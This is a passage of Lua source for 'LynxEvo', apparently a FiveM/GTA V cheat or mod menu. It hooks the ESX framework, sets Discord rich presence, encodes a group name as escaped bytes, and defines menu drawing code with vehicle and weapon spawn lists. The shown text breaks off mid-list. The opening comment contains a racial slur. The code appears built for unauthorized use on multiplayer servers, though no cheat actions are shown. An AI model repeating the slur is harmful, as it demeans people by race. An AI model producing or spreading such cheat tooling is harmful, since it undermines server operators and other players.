-- boo nigga
ESX = nil
Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent("esx:getSharedObject", function(obj) ESX = obj end)
		Citizen.Wait(1000)
	end

end)

local appid = '612395455862669378'

local asset = 'lynx' 

-- Discord RPC based of this guy : https://github.com/Zeemahh/discord-rp/blob/master/discord-rp/client.lua <3

local function SetRP()
	local name = GetPlayerName(PlayerId())
	local id = GetPlayerServerId(PlayerId())

	SetRichPresence(tostring(name) .. ' with 8R4')
	SetDiscordAppId(appid)
	SetDiscordRichPresenceAsset(asset)
	SetDiscordRichPresenceAssetText('Doing Lynx 8R4 stuff')
end

local setrp = false

rot = 1
local rotatier = false

LynxEvo = {}

LynxEvo.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 200
	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.041
local buttonFont = 0
local buttonScale = 0.370
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005
local bytecommunity = "\51\52\66\121\84\101\32\67\111\109\109\117\110\105\116\121"

local function debugPrint(text)
	if LynxEvo.debug then
		Citizen.Trace("[LynxEvo] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function LynxEvo.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = bytecommunity

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)
				menus[id].titleBackgroundColor = {r = ra.r, g = ra.g, b = ra.b, a = 105} --RGB
				menus[id].menuFocusBackgroundColor = {r = 255, g = 255, b = 255, a = 100} 
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "~h~~r~> ~s~SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

	debugPrint(tostring(id) .. " menu created")
end

function LynxEvo.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		LynxEvo.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", (subTitle))
		else
			setMenuProperty(id, "subTitle", (menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function LynxEvo.CurrentMenu()
	return currentMenu
end

function LynxEvo.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function LynxEvo.IsMenuOpened(id)
	return isMenuVisible(id)
end

function LynxEvo.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function LynxEvo.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function LynxEvo.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function LynxEvo.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function LynxEvo.MenuButton(text, id)
	if menus[id] then
		if LynxEvo.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function LynxEvo.CheckBox(text, bool, callback)
	local checked = "~r~~h~OFF"
	if bool then
		checked = "~g~~h~ON"
	end

	if LynxEvo.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function LynxEvo.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = '← '..tostring(selectedItem)..' →'
	end

	if LynxEvo.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function LynxEvo.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			LynxEvo.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					LynxEvo.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function LynxEvo.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function LynxEvo.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function LynxEvo.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function LynxEvo.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function LynxEvo.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function LynxEvo.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function LynxEvo.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function LynxEvo.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", (text))
end


function LynxEvo.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function LynxEvo.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function LynxEvo.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function LynxEvo.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function LynxEvo.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		AddTextEntry("FMMC_KEY_TIP1", "")
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		AddTextEntry("FMMC_KEY_TIP1", "")
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function drawNotification(text, param)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(param, false)
	if rgbnot then
		for i = 0, 24 do
			i = i + 1
			SetNotificationBackgroundColor(i)
		end
	else
	SetNotificationBackgroundColor(24)
	end
end

	-- LSC FUNCTIONS
	function checkValidVehicleExtras()
		local playerPed = PlayerPedId()
		local playerVeh = GetVehiclePedIsIn(playerPed, false)
		local valid = {}
		
		for i=0,50,1 do
			if(DoesExtraExist(playerVeh, i))then
				local realModname = "~h~Extra #"..tostring(i)
				local text = "OFF"
				if(IsVehicleExtraTurnedOn(playerVeh, i))then
					text = "ON"
				end
				local realSpawnname = "~h~extra "..tostring(i)
				table.insert(valid, {
					menuName=realModName,
					data ={
						["action"] = realSpawnName,
						["state"] = text
					}
				})
			end
		end
		
		return valid
	end
	
	
	function DoesVehicleHaveExtras( veh )
		for i = 1, 30 do 
			if ( DoesExtraExist( veh, i ) ) then 
				return true 
			end 
		end 
		
		return false 
	end 
	
	
	function checkValidVehicleMods(modID)
		local playerPed = PlayerPedId()
		local playerVeh = GetVehiclePedIsIn(playerPed, false)
		local valid = {}
		local modCount = GetNumVehicleMods(playerVeh,modID)
		
		-- Handle Liveries if they don't exist in modCount
		if (modID == 48 and modCount == 0) then
			
			-- Local to prevent below code running.
			local modCount = GetVehicleLiveryCount(playerVeh)
			for i=1, modCount, 1 do
				local realIndex = i - 1
				local modName = GetLiveryName(playerVeh, realIndex)
				local realModName = GetLabelText(modName)
				local modid, realSpawnName = modID, realIndex
				
				valid[i] = {
					menuName=realModName,
					data = {
						["modid"] = modid,
						["realIndex"] = realSpawnName
					}
				}
			end
		end
		-- Handles all other mods
		for i = 1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetModTextLabel(playerVeh, modID, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modCount, realIndex
			
			
			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
		
		
		-- Insert Stock Option for modifications
		if(modCount > 0)then
			local realIndex = -1
			local modid, realSpawnName = modID, realIndex
			table.insert(valid, 1, {
				menuName="Stock",
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			})
		end
		
		return valid
	end
	-- LSC FUNCTIONS END

local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}

local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
